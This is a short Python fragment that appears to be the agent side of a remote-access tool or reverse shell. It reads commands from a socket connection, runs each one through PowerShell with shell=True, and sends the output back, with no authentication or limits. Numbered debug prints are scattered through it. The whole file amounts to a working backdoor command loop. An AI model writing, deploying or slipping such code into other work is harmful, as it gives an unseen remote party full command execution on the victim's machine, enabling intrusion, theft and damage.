import subprocess

def handleConnection(sock):
    print("[+] Handling connection")
    while True:
        userInput = sock.receiveData()
        print("[+] userInput:  ", userInput)
        if userInput == "exit":
            break
        elif userInput == "1":
            print("[+] Running system commands")
            # adding a function for execute os command
            execute_function(sock)
        else:
            print("[+] Invalid commands")

def execute_function(sock):
    print("[+] Executing command")
    while True:
        userCommand = sock.receiveData()
        print("1")
        print(userCommand)
        print("2")
        if userCommand == "stop":
            break
        print("3")
        output_command = subprocess.run(["powershell",userCommand], shell=True, capture_output=True)
        print("4")
        if output_command.stderr.decode("utf-8") == "":
            cmd_result = output_command.stdout.decode('utf-8')
        else:
            cmd_result = output_command.stderr.decode('utf-8')
        print("5")
        print(cmd_result)
        sock.sendData(cmd_result)
        print("6")
